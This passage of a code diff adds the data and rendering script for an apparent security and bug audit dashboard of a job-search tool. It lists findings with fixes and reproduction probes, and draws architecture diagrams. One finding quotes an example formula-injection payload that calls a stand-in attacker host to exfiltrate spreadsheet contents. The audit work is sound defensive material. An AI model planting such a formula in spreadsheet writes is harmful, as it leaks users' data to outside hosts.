"W/cleanup/expired-job-cleanup.ts:627", "sheets-writeback.js:559-565"], "fix": "Before each batch, re-read `E{n}` for every target row and skip or re-resolve rows whose Link changed; write only changed cells instead of the full `A:Y` row.", "effort": "M", "build": "sol", "probes": ["p02-rowdrift-writer.mjs", "p03-cleanup-stale-overwrite.mjs"], "verify": "D2: REPRODUCED, D3: REPRODUCED, F16: not run"}, {"id": "D4", "ids": ["D4"], "lane": "D", "theme": "Sheet integrity", "sev": "P1", "status": "CONFIRMED", "claim": "Re-discovery overwrites user-edited Source, unlocked Salary, Priority, Tags, Talking Points and Fit Assessment. Fit Assessment holds the user-provided JD from manual ingest.", "loc": ["W/sheets/pipeline-writer.ts:266-312", "ingest-url-flow.js:184", "p05-rediscovery-overwrites-user-columns.mjs"], "fix": "Treat I,J,K,Q,F as fill-if-empty on merge (discovery owns only H,T,U), or widen Edit Lock to every column the dashboard lets a user edit.", "effort": "S", "build": "sol", "probes": ["p05-rediscovery-overwrites-user-columns.mjs"], "verify": "D4: REPRODUCED"}, {"id": "D5", "ids": ["D5", "F5"], "lane": "D", "theme": "Sheet integrity", "sev": "P1", "status": "CONFIRMED", "claim": "Sheet writes use `USER_ENTERED` with no escaping, so attacker-controlled posting text (worker writer) and prompt-injectable LLM output (rescore Talking Points) become live formulas such as `=IMPORTDATA(\"https://attacker/?q=\"&A1)` that read the user's Sheet out.", "loc": ["W/sheets/pipeline-writer.ts:572", "W/browser/selectors/shared.ts:46-48", "p06-formula-injection.mjs", "sheets-writeback.js:191"], "fix": "Prefix `'` to any text cell that starts with `= + - @` in `buildLeadRow` and the patcher, or switch the writer to `RAW` and format dates and numbers explicitly.", "effort": "S", "build": "sol", "probes": ["p06-formula-injection.mjs", "F-rescore-overlap.mjs"], "verify": "D5: REPRODUCED, F5: REPRODUCED"}, {"id": "D6", "ids": ["D6"], "lane": "D", "theme": "Sheet integrity", "sev": "P1", "status": "CONFIRMED", "claim": "`/pipeline-update` writes fixed letters with no header check. On a Sheet where the user inserted one column, it writes the stage into Contact and the note into Applied Date, and returns 200 `matched:true`. The browser writer uses the same fixed letters.", "loc": ["W/sheets/pipeline-patcher.ts:45-52", "sheets-writeback.js:485", "p08-patcher-header-drift.mjs"], "fix": "Read row 1 in the patcher and map by header label, or reuse `inspectHeaderRow`, and answer 409 `header_mismatch` on drift.", "effort": "S", "build": "sol", "probes": ["p08-patcher-header-drift.mjs"], "verify": "D6: REPRODUCED"}, {"id": "E2", "ids": ["E2"], "lane": "E", "theme": "API and AI layer", "sev": "P1", "status": "CONFIRMED", "claim": "Choosing \"Local\" (Ollama) in onboarding or Settings pins `provider:\"local\"`. ATS normalizes it to gemini and reports \"Missing API key. Save a key in Settings.\", so the ATS scorecard never works for local-model users while other consumers accept `local`.", "loc": ["ats-scorecard.mjs:826-840", "oneflow-beat-ai.js:149", "settings-modal.js:276", "probes/probe-e-local-pin.sh"], "fix": "Map `local`/`ollama` → `openai_compatible` in one shared provider normalizer used by all pin consumers.", "effort": "S", "build": "sol", "probes": ["probe-e-local-pin.sh"], "verify": "E2: REPRODUCED"}, {"id": "E3", "ids": ["E3"], "lane": "E", "theme": "API and AI layer", "sev": "P1", "status": "CONFIRMED", "claim": "The scrape fallback returns a **different posting** as the requested one. The Google Jobs lane accepts a title+company-only match (score ≥70 with no id or URL match) and returns another job id and location with the requested title. Lineage is hardcoded `linkedin-direct`, and no match-kind field lets the UI say \"similar posting\" (DOSSIER-01, server half).", "loc": ["shared/job-scraper-core.mjs:618-654", "probes/probe-e-serp-sibling.mjs"], "fix": "Accept only idMatch/urlMatch as the posting. Otherwise return `matchKind:\"title_company\"`, `confidence`, `fetchedAt`, and set lineage from the real source host.", "effort": "M", "build": "sol", "probes": ["probe-e-serp-sibling.mjs"], "verify": "E3: REPRODUCED"}, {"id": "E4", "ids": ["E4"], "lane": "E", "theme": "API and AI layer", "sev": "P1", "status": "CONFIRMED", "claim": "AUTH-03: hosted server correctly returns 401 without a token, but **no packaged browser caller sends one**. `hosted-api-auth.js` and `getJobBoredApiToken` (app-config-core.js:184) have 0 call sites, so hosted users cannot save a pin, scrape or score.", "loc": ["hosted-api-auth.js:1-59", "app-config-core.js:184-189", "settings-modal.js:301", "oneflow-beat-ai.js:535"], "fix": "Route every API fetch through one `apiFetch()` that calls `JobBoredHostedApiAuth.applyHostedApiAuth`, and add a test that greps callers.", "effort": "M", "build": "opus", "probes": ["probe-e-hosted.sh"], "verify": "E4: REPRODUCED"}, {"id": "E5", "ids": ["E5"], "lane": "E", "theme": "API and AI layer", "sev": "P1", "status": "CONFIRMED", "claim": "Docker and Render images (build context `server/`) are missing runtime files under `../integrations`. POST /profile returns 500 `write_failed` (schema ENOENT) and **leaks the absolute server path**. The brand-logo resolver script is absent, and `node:20-alpine` has no python3.", "loc": ["user-profile.mjs:29-37", "brand-logos.mjs:47-49", "render.yaml:6", "probes/probe-e-docker-sim.sh"], "fix": "Vendor the schema into server/ (or build from repo root with explicit COPY). In hosted mode, return 501 `LOGOS_UNAVAILABLE` for the logo routes or install python3. Never return fs paths in `detail`.", "effort": "M", "build": "sol", "probes": ["probe-e-docker-sim.sh"], "verify": "E5: REPRODUCED"}, {"id": "F1", "ids": ["F1"], "lane": "F", "theme": "Materials and profile", "sev": "P1", "status": "CONFIRMED", "claim": "Every user gets the repo owner's resume, tailored. The drafter's master resume is the tracked template (Emilio Nunez-Garcia, email, phone, Audacy roles). The user's profile and resume never reach the writer.", "loc": ["materials-drafter.mjs:30-45", "materials-writer.mjs:33", "materials-critic.mjs:108", "F-materials-e2e.sh"], "fix": "Build the master from the user's resume and profile (the #120 claim ledger). Fail with `ledger_empty` when neither exists.", "effort": "L", "build": "sol", "probes": ["F-materials-e2e.sh"], "verify": "F1: REPRODUCED"}, {"id": "F2", "ids": ["F2"], "lane": "F", "theme": "Materials and profile", "sev": "P1", "status": "CONFIRMED", "claim": "A draft can never be READY. The critic runs the banned-filler regex over the whole composed cover-letter HTML, and the template's own guidance comment (line 34) lists the banned phrases. Every draft gets `banned_filler`, both editor loops always run, and the status ends at REVIEW.", "loc": ["materials-critic.mjs:10", "materials-drafter.mjs:776-799", "F-profile-critic.mjs"], "fix": "Test the regex only against writer JSON letter strings (or visible slot text).", "effort": "S", "build": "", "probes": ["F-profile-critic.mjs"], "verify": "F2: REPRODUCED"}, {"id": "F4", "ids": ["F4"], "lane": "F", "theme": "Materials and profile", "sev": "P1", "status": "CONFIRMED", "claim": "Overlapping rescores have no lock. When an older-profile run finishes after a newer one, it overwrites the newer scores in the Sheet, and LLM spend doubles.", "loc": ["index.mjs:542-661", "profile-rescore-worker.mjs:1324-1515", "F-rescore-overlap.mjs"], "fix": "Keep a single-flight lock plus a run generation id. A new run aborts the old one, and a write is skipped when profile.updatedAt is no longer current. Return 409 `rescore_in_progress`.", "effort": "M", "build": "sol", "probes": ["F-rescore-overlap.mjs"], "verify": "F4: REPRODUCED"}, {"id": "F7", "ids": ["F7", "E13"], "lane": "F", "theme": "Materials and profile", "sev": "P1", "status": "CONFIRMED", "claim": "`POST /profile` writes profile-derived `logos.json` into the tracked repo file whenever `~/.hermes/job-hunt/resume-template` is absent, which is every OSS install and every sandbox. The trigger was my probe `bash .lane-evidence/probes/F-materials-e2e.sh` (first run, `POST /profile` at 2026-09-25T10:42:57Z, HOME=sandbox). Writer: index.mjs:351 → brand-logos.mjs:410 → 398-402, root fallback :84-87 → :51-53. Risks: user employer names land in a tracked file that a later commit or PR ships; the shipped example is clobbered (here emptied); Emilio's main checkout shows the same dirty file. It also spawns the resolver, which sends employer names to Clearbit and Google.", "loc": ["logos.js", "brand-logos.mjs:47-52", "probes/probe-e-errshape.sh"], "fix": "Default the template root to `~/.jobbored/resume-template` (copy on first use). Never write under the repo at runtime. Add a test that `POST /profile` leaves `git status` clean.", "effort": "S", "build": "sol", "probes": ["probe-e-errshape.sh"], "verify": "F7: REPRODUCED, E13: REPRODUCED"}, {"id": "G3", "ids": ["G3"], "lane": "G", "theme": "Local ops and relay", "sev": "P1", "status": "CONFIRMED", "claim": "Static serving is a denylist over the whole repo with no Host check, so gitignored local artifacts are served: sandbox returned 200 for `tmp/*.log`, `docs/redesign/logs/*.log` (.gitignore:40 \"may contain transcripted secrets\"), `uploads/*`, `profile/*.zip`; live :8080 returned 200 for `tmp/jobbored-dev.log`, `docs/redesign/logs/fe-dashboard.log`, `tmp/reauth-google-token.py` (status only, bodies discarded). Reachable by DNS rebinding and tailnet peers. P0 if those logs hold secrets (not read, boundary).", "loc": ["scripts/lib/static-path-guard.mjs:7-29", "dev-server.mjs:704", "g-static-traversal.sh"], "fix": "Serve an allowlist (index.html, partials/, assets/, *.js/*.css at root, docs/*.md) and add the Host check from G2.", "effort": "S", "build": "sol", "probes": ["g-static-traversal.sh"], "verify": "G3: REPRODUCED"}, {"id": "G4", "ids": ["G4"], "lane": "G", "theme": "Local ops and relay", "sev": "P1", "status": "CONFIRMED (browser→proxy) / INFERRED (server chain)", "claim": "Opening the discovery wizard with the worker down silently POSTs `/__proxy/full-boot` without `skip_tunnel`, which runs bootstrap (starts a public cloudflared quick tunnel or ngrok to the worker) and, if the URL changed, redeploys the Cloudflare relay: an outward-facing exposure and deploy with no consent, while discovery-state itself says ngrok is retired.", "loc": ["discovery-wizard-ui.js:2729", "discovery-autodetect.js:115-125", "dev-server.mjs:1215-1216", "scripts/lib/discovery-transport.mjs:106-124"], "fix": "Autodetect may only start the local worker (`skip_tunnel=1`); tunnel start and relay deploy become explicit buttons that show the write scope first.", "effort": "S", "build": "sol", "probes": ["g-autodetect-fullboot.mjs"], "verify": "G4: REPRODUCED"}, {"id": "G5", "ids": ["G5"], "lane": "G", "theme": "Local ops and relay", "sev": "P1", "status": "CONFIRMED", "claim": "When a non-worker (Hermes gateway) holds the worker port, `npm run dev`'s starter spawns anyway, prints an unhandled EADDRINUSE stack and then the false line \"something else terminated the listener\", exits 1, and `concurrently -k` takes web+scraper down; nothing names the owner or the fix, although bootstrap already has `findAvailableWorkerPort`/`portHasForeignListener`.", "loc": ["scripts/start-discovery-worker-local.mjs:212-227", "package.js", "tests/discovery-coexistence-port.test.mjs:54", "g-port-collision.sh"], "fix": "Before spawning, if /health is not the worker and the port is bound, print the owning command (lsof) and \"set BROWSER_USE_DISCOVERY_PORT or move Hermes webhook to 8645\", and hold (do not exit) so the dev stack survives.", "effort": "S", "build": "sol", "probes": ["g-port-collision.sh"], "verify": "G5: REPRODUCED"}, {"id": "G6", "ids": ["G6"], "lane": "G", "theme": "Local ops and relay", "sev": "P1", "status": "IN-FLIGHT #111", "claim": "A reused worker is never re-probed: kill it and the starter holds forever with nothing on the port (reproduced on 18173); live now: the `npm run dev` starter PID 65376 has no child while :8644 is owned by another process.", "loc": ["scripts/start-discovery-worker-local.mjs:229-239", "g-respawn-hold.sh"], "fix": "#111 re-probes /health every 5s while holding and respawns via superviseWorker on the first failed probe. Residual (INFERRED): a single missed 1s probe from a busy worker triggers a respawn that hits EADDRINUSE, exits 1 and tears the stack down; require 2-3 consecutive failures plus a port-free check.", "effort": "S", "build": "sol", "probes": ["g-respawn-hold.sh"], "verify": "G6: REPRODUCED"}, {"id": "H1", "ids": ["H1", "H17"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED", "claim": "Both Hermes approval steps match companies by substring: Gate 2 accepts `YES SUBMIT METABASE` for Meta, any `YES SUBMIT …` when the company cell is blank, any group member, and a YES after a NO; the interest approver flips every row whose company contains the reply (and every blank-company row).", "loc": ["integrations/hermes-job-hunt/scripts/gate2_telegram.py:214-231", "h_probe_pure.py", "integrations/hermes-job-hunt/scripts/gate1-approve.py:168-189"], "fix": "Exact match on the normalized phrase only. Require `reply_to_message.message_id == request id` and a sender id from an allowlist in the contract. Cancel on any other reply. Refuse to send when the company is blank.", "effort": "S", "build": "sol", "probes": ["h_probe_pure.py", "case"], "verify": "H1: REPRODUCED, H17: REPRODUCED"}, {"id": "H2", "ids": ["H2"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED", "claim": "The Gate 1 lookup keys rows by a lossy URL normalizer. The unanchored prefix regex strips `sid`, `ref*`, `si*` and `ei*` params, and the path is lowercased. Distinct jobs collapse to one key, and the first matching row wins, so an unapproved job inherits another row's `Approved` and shares its submit lock. The docstring says it mirrors lead-normalizer.ts; it does not.", "loc": ["integrations/hermes-job-hunt/scripts/jhos_submit.py:51-54", "integrations/browser-use-discovery/src/normalize/lead-normalizer.ts:25-26"], "fix": "Use the TS anchored pattern and keep path case. Fail closed when more than one row matches. Add a shared parity fixture.", "effort": "S", "build": "sol", "probes": ["case"], "verify": "H2: REPRODUCED"}, {"id": "H3", "ids": ["H3"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED (notes wipe) / INFERRED (row drift)", "claim": "The Applied write is an unsafe read-modify-write. If the Notes GET fails (timeout or 429), existing Notes are overwritten with only the Hermes line. It writes to a row number captured before the ≤10-min Gate 2 wait and the fill, so a sort or insert in between lands Applied, the date and Notes on another job. It uses USER_ENTERED on user text.", "loc": ["integrations/hermes-job-hunt/scripts/jhos_submit.py:334-351", "integrations/hermes-job-hunt/scripts/apply-orchestrator.py:309-314"], "fix": "Re-resolve the row by link right before writing and abort if the Notes read fails. Append via `values.append` or a read-and-verify of the link cell. Use RAW.", "effort": "S", "build": "sol", "probes": ["case"], "verify": "H3: REPRODUCED"}, {"id": "H4", "ids": ["H4"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED", "claim": "The final-submit classifier is a term list. Buttons labelled `Send`, `Done`, `Confirm` or `Send my application` are not \"submit-like\", so the click skips the required-field safety gate and never sets `submit_attempted`. The orchestrator then reports \"Submit failed … retry required\" after a real submission, which risks a duplicate application.", "loc": ["integrations/hermes-job-hunt/scripts/universal_filler.py:61", "integrations/hermes-job-hunt/scripts/apply-orchestrator.py:272-277"], "fix": "Treat any click on `type=submit`, or on the last form's button, as final. Always run the safety gate before any click in live mode. Treat unknown post-click state as `unknown_after_submit`, never as \"retry\".", "effort": "M", "build": "sol", "probes": ["case"], "verify": "H4: REPRODUCED"}, {"id": "H5", "ids": ["H5"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED (term hit) / INFERRED (end to end)", "claim": "\"Verified\" submission is a page-text substring check (`thank you`, …). Many application forms say \"Thank you for your interest…\" before submit, so a failed submit can be marked verified and the Sheet row set to Applied.", "loc": ["integrations/hermes-job-hunt/scripts/universal_filler.py:63", "integrations/hermes-job-hunt/scripts/apply-orchestrator.py:266"], "fix": "Require a URL change or the form's disappearance plus an ATS-specific success marker. Store the screenshot hash in evidence.", "effort": "M", "build": "sol", "probes": ["case"], "verify": "H5: REPRODUCED"}, {"id": "H6", "ids": ["H6"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED (static)", "claim": "`greenhouse_filler.py` submits live by default. `--dry-run` is opt-in, and there is no Gate 1, Gate 2 or lock. It sets `submitted=True` right after the click without verification. It has no callers and is dead but runnable.", "loc": ["integrations/hermes-job-hunt/scripts/greenhouse_filler.py:308-328", "h_static.sh"], "fix": "Delete it; universal_filler supersedes it.", "effort": "S", "build": "sol", "probes": ["h_static.sh"], "verify": "H6: REPRODUCED"}, {"id": "H7", "ids": ["H7"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED (static)", "claim": "The direct `universal_filler.py --submit` CLI skips Gate 1 and the lock. Its Gate 2 is a self-asserted env flag `JHOS_GATE2_CONFIRMED=1`, which `.env.example` documents as a bypass.", "loc": ["integrations/hermes-job-hunt/scripts/universal_filler.py:12-13", "h_static.sh"], "fix": "Remove live mode from the CLI (orchestrator only), or make the CLI call `gate1_check`, `lock_acquire` and the Telegram confirm. Drop the env bypass from `.env.example`.", "effort": "S", "build": "sol", "probes": ["h_static.sh"], "verify": "H7: REPRODUCED"}, {"id": "H8", "ids": ["H8", "F18", "H21"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "CONFIRMED (static)", "claim": "Emilio's personal data ships in the PUBLIC repo and acts as the product default: real name, email, phone and ZIP as the apply filler's answers, the same identity in the resume and cover-letter templates, and his Pipeline sheet ID and Telegram chat ID hardcoded in four scripts and the approval contract. An OSS user's assisted apply would submit Emilio's identity; follow-up scripts target his Sheet.", "loc": ["integrations/hermes-job-hunt/scripts/filler_profile.py:14-29", "integrations/hermes-job-hunt/scripts/greenhouse_filler.py:32-40", "integrations/hermes-job-hunt/tests/test_phase7_universal_filler.py:15-16", "h_static.sh"], "fix": "Load the identity from the gitignored `profile/profile.md` (template `profile/profile.example.md` exists) and fail closed when it is missing. Use example values in tests. Whether to scrub history is Emilio's call.", "effort": "S", "build": "sol", "probes": ["h_static.sh"], "verify": "H8: REPRODUCED, F18: REPRODUCED, H21: REPRODUCED"}, {"id": "H9", "ids": ["H9"], "lane": "H", "theme": "Hermes apply", "sev": "P1", "status": "INFERRED", "claim": "The Gate 2 poll is a second `getUpdates` consumer on the bot token the Hermes gateway also uses (`~/.hermes/.env`). Concurrent long-polls return 409 Conflict, which is treated as transient and retried until timeout, so Gate 2 can never confirm. The `offset=-1` flush also acknowledges and drops the gateway's pending updates.", "loc": ["integrations/hermes-job-hunt/scripts/gate2_telegram.py:42-59"], "fix": "Receive confirmations through the gateway (inline button callback or relay) rather than a second poller. Log `getUpdates` errors instead of swallowing them.", "effort": "M", "build": "sol", "probes": [], "verify": "H9: COULD-NOT-RUN"}];
+const esc = s => String(s ?? "").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const md = s => esc(s).replace(/`([^`]+)`/g, "<code>$1</code>").replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
+
+/* ---------- graph renderer ---------- */
+function graph(nodes, edges, w, h, opts={}) {
+  const byId = Object.fromEntries(nodes.map(n => [n.id, n]));
+  const center = n => [n.x + n.w/2, n.y + n.h/2];
+  function clip(n, tx, ty) {
+    const [cx, cy] = center(n), dx = tx - cx, dy = ty - cy;
+    if (!dx && !dy) return [cx, cy];
+    const sx = (n.w/2 + 3) / Math.abs(dx || 1e-9), sy = (n.h/2 + 3) / Math.abs(dy || 1e-9), s = Math.min(sx, sy);
+    return [cx + dx*s, cy + dy*s];
+  }
+  const stroke = st => st === "new" ? "var(--mint)" : st === "chg" ? "var(--amber-bright)" : st === "risk" ? "var(--rose)" : "var(--line-strong)";
+  let out = `<svg viewBox="0 0 ${w} ${h}" role="img" aria-label="${esc(opts.label||"diagram")}" xmlns="http://www.w3.org/2000/svg">
+  <defs>${["ink","new","chg","risk"].map(k => `<marker id="ah-${opts.key}-${k}" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" style="fill:${k==="ink"?"var(--ink-3)":stroke(k)}"/></marker>`).join("")}</defs>`;
+  for (const b of (opts.bands||[])) {
+    out += `<rect x="${b.x}" y="${b.y}" width="${b.w}" height="${b.h}" rx="14" style="fill:${b.fill};stroke:${b.stroke};stroke-width:1.5;stroke-dasharray:6 5"/>
+    <text x="${b.x+12}" y="${b.y+ (b.labelY||16)}" style="fill:${b.stroke};font:700 11px var(--f-body);letter-spacing:.04em">${esc(b.label)}</text>`;
+  }
+  for (const e of edges) {
+    const a = byId[e[0]], b = byId[e[1]];
+    const [bx, by] = center(b), [ax, ay] = center(a);
+    const [x1, y1] = clip(a, bx, by), [x2, y2] = clip(b, ax, ay);
+    const st = e[3] || "";
+    out += `<line x1="${x1.toFixed(1)}" y1="${y1.toFixed(1)}" x2="${x2.toFixed(1)}" y2="${y2.toFixed(1)}" style="stroke:${st?stroke(st):"var(--ink-3)"};stroke-width:${st?1.8:1.1};opacity:${st?1:.55}${e[4]?";stroke-dasharray:4 4":""}" marker-end="url(#ah-${opts.key}-${st||"ink"})"/>`;
+    if (e[2]) { const mx=(x1+x2)/2, my=(y1+y2)/2; out += `<text x="${mx}" y="${my-4}" text-anchor="middle" style="fill:${st?stroke(st):"var(--ink-3)"};font:600 9.5px var(--f-mono);paint-order:stroke;stroke:var(--surface);stroke-width:3px">${esc(e[2])}</text>`; }
+  }
+  for (const n of nodes) {
+    const st = n.state || "";
+    const fill = st === "new" ? "var(--mint-soft)" : st === "chg" ? "var(--amber-soft)" : n.ext ? "var(--surface-2)" : "var(--surface)";
+    out += `<g><rect x="${n.x}" y="${n.y}" width="${n.w}" height="${n.h}" rx="${n.ext?8:12}" style="fill:${fill};stroke:${st?stroke(st):"var(--line-strong)"};stroke-width:${st?2:1.2}"/>
+      <text x="${n.x+10}" y="${n.y+20}" style="fill:var(--ink);font:700 12px var(--f-body)">${esc(n.label)}</text>
+      ${n.sub?`<text x="${n.x+10}" y="${n.y+36}" style="fill:var(--ink-2);font:500 10px var(--f-body)">${esc(n.sub)}</text>`:""}
+      ${n.sub2?`<text x="${n.x+10}" y="${n.y+49}" style="fill:var(--ink-2);font:500 10px var(--f-body)">${esc(n.sub2)}</text>`:""}`;
+    if (n.risk) {
+      const tw = n.risk.length*6.2 + 12;
+      out += `<rect x="${n.x+n.w-tw-6}" y="${n.y-9}" width="${tw}" height="18" rx="9" style="fill:var(--rose)"/><text x="${n.x+n.w-tw/2-6}" y="${n.y+4}" text-anchor="middle" style="fill:#fff;font:700 10px var(--f-mono)">${esc(n.risk)}</text>`;
+    }
+    out += `</g>`;
+  }
+  return out + `</svg>`;
+}
+
+/* ---------- Now / Next ---------- */
+const NOW_NODES = [
+  {id:"br",x:270,y:14,w:220,h:50,label:"Browser dashboard",sub:"~120 JS modules · user's OAuth token"},
+  {id:"dev",x:16,y:122,w:220,h:58,label:":8080 dev-server",sub:"static files · 20 /__proxy routes",sub2:"/profile proxy",risk:"G2 G3 G4"},
+  {id:"api",x:270,y:122,w:220,h:58,label:":3847 API server",sub:"24 routes · scrape · ATS · materials",sub2:"same-origin from Host header",risk:"E1 E4"},
+  {id:"wk",x:524,y:122,w:220,h:58,label:":8644 discovery worker",sub:"7 routes · run loop · SQLite memory",sub2:"URL parsed before any try",risk:"A1 B1"},
+  {id:"relay",x:16,y:244,w:220,h:52,label:"Cloudflare relay",sub:"injects secret for any caller",risk:"G1"},
+  {id:"fs",x:270,y:244,w:220,h:52,label:"~/.jobbored + repo templates",sub:"llm.json · profile · owner resume",risk:"F1 F7"},
+  {id:"hm",x:524,y:244,w:220,h:52,label:"Hermes :8645 + cron",sub:"apply (shelved) · follow-up",risk:"H1–H9"},
+  {id:"gs",x:16,y:372,w:160,h:52,ext:1,label:"Google Sheet",sub:"7 writers · no lock",risk:"D1 D2"},
+  {id:"llm",x:196,y:372,w:170,h:52,ext:1,label:"LLM providers",sub:"7 separate clients",risk:"E2"},
+  {id:"ext",x:386,y:372,w:190,h:52,ext:1,label:"ATS · SerpApi · Browser Use",sub:"3 paths skip safeFetch",risk:"C1"},
+  {id:"tg",x:596,y:372,w:148,h:52,ext:1,label:"Telegram",sub:"2nd poller on the bot"}
+];
+const NOW_EDGES = [["br","dev"],["br","api"],["br","gs"],["br","llm"],["dev","api"],["dev","wk"],["relay","wk","","risk"],["api","fs"],["wk","fs"],["wk","gs"],["api","gs"],["api","llm"],["wk","llm"],["wk","ext","","risk"],["api","ext"],["hm","wk"],["hm","gs"],["hm","tg"]];
+const NEXT_NODES = [
+  {id:"br",x:270,y:10,w:220,h:46,label:"Browser dashboard",sub:"apiFetch() sends hosted token",state:"chg"},
+  {id:"dev",x:30,y:112,w:210,h:52,label:":8080 dev-server",sub:"static allowlist · explicit setup"},
+  {id:"api",x:275,y:112,w:210,h:52,label:":3847 API server",sub:"api-error.v1 envelope",state:"chg"},
+  {id:"wk",x:520,y:112,w:210,h:52,label:":8644 discovery worker",sub:"runAsyncLifecycle · cancel"},
+  {id:"relay",x:30,y:212,w:210,h:44,label:"Relay (token auth)",sub:"path allowlist",state:"chg"},
+  {id:"fs",x:275,y:212,w:210,h:44,label:"~/.jobbored user data root",sub:"templates · logos · claim ledger",state:"chg"},
+  {id:"hm",x:520,y:212,w:210,h:44,label:"Hermes (jhos_common)",sub:"exact gates · reply-to · events",state:"chg"},
+  {id:"sc",x:16,y:298,w:170,h:44,label:"Sheets client",sub:"mutex · re-resolve · events",state:"new"},
+  {id:"ai",x:200,y:298,w:170,h:44,label:"ai/provider.mjs",sub:"1 enum · pin keys · signals",state:"new"},
+  {id:"eg",x:384,y:298,w:180,h:44,label:"Egress: safeFetch",sub:"every URL · redirect strip · cap",state:"new"},
+  {id:"gs",x:16,y:390,w:170,h:44,ext:1,label:"Google Sheet",sub:"+ PipelineEvents · Review tabs"},
+  {id:"llm",x:200,y:390,w:170,h:44,ext:1,label:"LLM providers"},
+  {id:"ext",x:384,y:390,w:180,h:44,ext:1,label:"ATS · SerpApi · Browser Use"},
+  {id:"tg",x:590,y:390,w:140,h:44,ext:1,label:"Telegram",sub:"via gateway only"}
+];
+const NEXT_EDGES = [["br","dev"],["br","api","","chg"],["br","gs"],["dev","api"],["dev","wk"],["relay","wk","","chg"],["api","fs"],["wk","fs"],["api","ai","","new"],["wk","ai","","new"],["ai","llm","","new"],["api","eg","","new"],["wk","eg","","new"],["eg","ext","","new"],["wk","sc","","new"],["api","sc","","new"],["sc","gs","","new"],["hm","wk"],["hm","gs"],["hm","tg"]];
+document.getElementById("svg-now").innerHTML = graph(NOW_NODES, NOW_EDGES, 760, 440, {key:"now",label:"Current backend architecture"});
+document.getElementById("svg-next").innerHTML = graph(NEXT_NODES, NEXT_EDGES, 760, 450, {key:"next",label:"Target backend architecture",bands:[{x:16,y:92,w:728,h:84,fill:"color-mix(in srgb, var(--mint-soft) 45%, transparent)",stroke:"var(--mint)",label:"LOOPBACK GUARD · Host + Origin allowlist on every listener",labelY:14}]});
+const MOVES = [
+  ["Loopback guard","One Host + Origin check in front of :8080, :3847 and :8644. Closes E1, G2, G3; A1 moves the URL parse inside a try."],
+  ["Egress","safeFetch for session fetch, agent-browser pre-spawn and cleanup; strips credentials on cross-origin redirects; byte cap."],
+  ["AI provider module","server/ai/provider.mjs replaces 7 clients; worker re-exports; browser calls /api/ai/chat. Fixes E2, E10."],
+  ["Sheets client","Token cache, per-Sheet mutex, Link re-resolution, schema-generated column map, PipelineEvents append."],
+  ["Error envelope","api-error.v1 { error, code, detail, nextStep, retryable } on the API and the worker."],
+  ["User data root","Templates, logos and personal defaults leave the repo for ~/.jobbored. Materials build from the user's own resume."]
+];
+document.getElementById("moves").innerHTML = MOVES.map(([t,d]) => `<div class="move"><b>${esc(t)}</b>${esc(d)}</div>`).join("");
+
+/* ---------- Fixes ---------- */
+const LANES = {A:"Worker ingress",B:"Discovery engine",C:"Sources and SSRF",D:"Sheet integrity",E:"API and AI layer",F:"Materials and profile",G:"Local ops and relay",H:"Hermes apply"};
+const FILTERS = [["all","All 39"],["P0","P0 only"],...Object.entries(LANES)];
+let fsel = "all";
+function renderFilters(){
+  document.getElementById("filters").innerHTML = FILTERS.map(([k,l]) => `<button class="fbtn" data-f="${k}" aria-pressed="${fsel===k}">${esc(l)}</button>`).join("");
+}
+function probeTest(c){
+  const p = (c.probes||[]).filter(x => x && x !== "case");
+  if (c.lane === "H" && (!p.length || (c.probes||[]).includes("case"))) p.unshift("h_probe_pure.py");
+  if (!p.length) return "Not runnable in a sandbox (live Telegram); add a unit test with a stubbed getUpdates that returns 409.";
+  return `Promote <code>.lane-evidence/probes/${esc(p[0])}</code> to a regression test: it reproduces the defect at f227fbb and must pass after the fix.`;
+}
+function renderCards(){
+  const list = CARDS.filter(c => fsel === "all" || (fsel === "P0" ? c.sev === "P0" : c.lane === fsel));
+  document.getElementById("cards").innerHTML = list.map(c => {
+    const locs = (c.loc||[]).filter(l => !/^(sec05|repro|probe|C-|B-|p\d|g-|h_|F-)/.test(l));
+    const verified = /REPRODUCED|CONFIRMED-BY/.test(c.verify);
+    const inflight = /IN-FLIGHT/.test(c.status);
+    return `<article class="card ${c.sev}">
+      <div class="top"><span class="chip sev-${c.sev}">${c.sev}</span><span class="id">${esc(c.id)}</span>${c.ids.length>1?`<span class="merged">+ ${esc(c.ids.slice(1).join(", "))}</span>`:""}<span class="theme">${esc(LANES[c.lane])}</span></div>
+      <div class="step"><span>Symptom</span><p class="claim">${md(c.claim)}</p></div>
+      <button class="more" type="button">Show full symptom</button>
+      <div class="step"><span>Root cause</span><div class="locs">${locs.map(l => `<span class="loc">${esc(l)}</span>`).join("") || '<span class="loc">see REGISTER.md</span>'}</div></div>
+      <div class="step"><span>Fix</span><p>${md(c.fix)}</p></div>
+      <div class="step"><span>Proves it</span><p>${probeTest(c)}</p></div>
+      <div class="foot"><span class="chip ${inflight?"warn":verified?"ok":"warn"}">${esc(inflight?c.status:(verified?"Muse: reproduced":"Muse: "+c.verify.replace(/^[A-Z0-9]+: /,"")))}</span><span class="chip">effort ${esc(c.effort)}</span><span class="chip">build ${esc(c.build||"sol")}</span></div>
+    </article>`;
+  }).join("");
+}
+document.getElementById("filters").addEventListener("click", e => { const b = e.target.closest(".fbtn"); if (!b) return; fsel = b.dataset.f; renderFilters(); renderCards(); });
+document.getElementById("cards").addEventListener("click", e => { const b = e.target.closest(".more"); if (!b) return; const card = b.closest(".card"); card.classList.toggle("open"); b.textContent = card.classList.contains("open") ? "Show less" : "Show full symptom"; });
+renderFilters(); renderCards();
+
+/* ---------- Contracts ---------- */
+const J = o => JSON.stringify(o, null, 2);
+const CONTRACTS = [
+  {name:"Error envelope", ver:"api-error.v1", kind:"new", ids:"E7 · A13 · F13 · D21",
+   why:"Every non-2xx body from the API and the worker gets one shape, so the dashboard stops string-matching messages and can show a next step.",
